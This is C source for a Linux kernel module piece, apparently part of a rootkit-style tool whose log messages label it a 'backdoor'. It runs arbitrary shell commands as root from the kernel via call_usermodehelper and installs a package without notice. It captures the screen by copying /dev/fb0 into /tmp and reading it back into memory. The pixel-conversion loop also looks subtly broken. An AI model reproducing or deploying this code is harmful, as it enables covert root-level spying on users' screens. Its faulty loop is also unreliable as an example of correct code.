#include <linux/string.h>
#include <linux/vmalloc.h>
#include <linux/fs.h>
#include <linux/kmod.h>

#include "framelogger.h"

/*
    Function that executes a shell command
    @param cmd command to be executed
*/
int execute_shell_command(char *cmd) {
    // Configure the shell and the environment
    char *argv[] = {"/bin/sh", "-c", (char *)cmd, NULL};
    char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };

    int ret;

    printk(KERN_INFO "backdoor: command executed=> %s", cmd);

    // Function that executes the command in the shell
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    if (ret < 0) {
        printk(KERN_ERR "backdoor: Error executing usermodehelper: %d\n", ret);
        return ret;
    } else {
        printk(KERN_INFO "backdoor: Successfully executed usermodehelper\n");
    }

    return 0;
}

/*
    Function that reads a file and retrives the data in a buffer.
    @param filename the name of the file
    @param buffer the buffer where the data will be retrived
    @param buffer_size the size of the buffer
*/
int read_file(char *filename, char *buffer, size_t buffer_size) {
	struct file *file;
	loff_t pos = 0;	
	ssize_t bytes_read;

	memset(buffer, 0, buffer_size);
	
	// Open the file
	file = filp_open(filename, O_RDONLY, 0);
	if (IS_ERR(file)) {
		printk(KERN_ERR "backdoor: Error opening file %s\n", filename);
		return -ENOENT;
	}
	
	// Read the file
	bytes_read = kernel_read(file, buffer, buffer_size, &pos);

	// Close file
	filp_close(file, NULL);
	
	return 0;
}

/*
    Function that records the frame buffer 0 and stores
    the information at the struct passed as parameter.

    IMPORTANT! Remember to free the rgb_buffer inside
    the fb struct! This is done by calling the
    clean_frame_buffer() after consuming the frame_buffer

    @param frame_buffer pointer to struct to be filled
*/
int record_frame_buffer(struct frame_buffer* fb) {
	char command[64];
	char resolution_buffer[64];
	char file_name[42];
	char* framebuffer;
	char* rgb_buffer;
	int framebuffer_size, rgb_size;
	int error;
	int i, j = 0;

	// Install neofetch if not installed (ONLY ON DEBIAN BASED SYSTEMS)
	strcpy(command, "apt install neofetch -y");
	error = execute_shell_command(command);
	
	if (error) {
		printk(KERN_ERR "backdoor: Error executing shell command: %d\n", error);
		return -EINVAL;
	}

	// Record the resolution of the screen before copying the frame buffer
	strcpy(command, "neofetch | grep -oP '\\S+x\\S+' > /tmp/screen_resolution.txt");
	strcpy(file_name, "/tmp/screen_resolution.txt");
	error = execute_shell_command(command);	

	if (error) {
		printk(KERN_ERR "backdoor: Error executing shell command: %d\n", error);
		return -EINVAL;
	}	

	read_file(file_name, resolution_buffer, 64);

	// Parses resolution values	
	if(sscanf(resolution_buffer, "%dx%d", &fb->xres, &fb->yres) != 2) {
		printk(KERN_ERR "backdoor: Failed to parse resolution values\n");
		return -EINVAL;
	}	
	
	printk(KERN_INFO "backdoor: Resolution %dx%d\n", fb->xres, fb->yres);

	// Calculates screen size in bytes (1 byte blue + 1 byte green + 1 byte red + 1 byte align)
	framebuffer_size = fb->xres * fb->yres * 4;
	framebuffer = (char *) vmalloc(sizeof(char) * framebuffer_size);
	
	if(!framebuffer) {
		printk(KERN_ERR "backdoor: Failed to allocate memory\n");
		return -ENOMEM;
	}

	// Calculates screen rgb size in bytes
	rgb_size = fb->xres * fb->yres * 3;
	rgb_buffer = (char *) vmalloc(sizeof(char) * rgb_size);
	
	if(!rgb_buffer) {
		printk(KERN_ERR "backdoor: Failed to allocate memory\n");
		vfree(framebuffer);
		return -ENOMEM;
	}


	// 'Screenshots' the screen by copying the framebuffer
	strcpy(command, "cp /dev/fb0 /tmp/fb_copy");
	strcpy(file_name, "/tmp/fb_copy");
	error = execute_shell_command(command);

	if (error) {
		printk(KERN_ERR "backdoor: Error executing shell command: %d\n", error);
		return -EINVAL;
	}

	// Actually reads the copy of the frame buffer
	read_file(file_name, framebuffer, framebuffer_size);	

	// Fills the frame_buffer struct with 
    	for(i = 0; i < rgb_size; i++) {
    		rgb_buffer[j++ + 2] = framebuffer[i++]; // BLUE
		rgb_buffer[j++] = framebuffer[i++]; // GREEN
		rgb_buffer[j++ - 2] = framebuffer[i++]; // RED
    	}
	
	// Observation: The information is stored at the fb0 as {1 byte BLUE, 1 byte GREEN, 1 byte RED, 1 byte PADDING}

	fb->rgb_buffer = rgb_buffer;
	
	vfree(framebuffer);

	return 0;
}


/*
    Function that cleans the frame_buffer by freeing the
    rgb_buffer allocated by record_frame_buffer()
 */
void clean_frame_buffer(struct frame_buffer* fb) {
	vfree(fb->rgb_buffer);
}
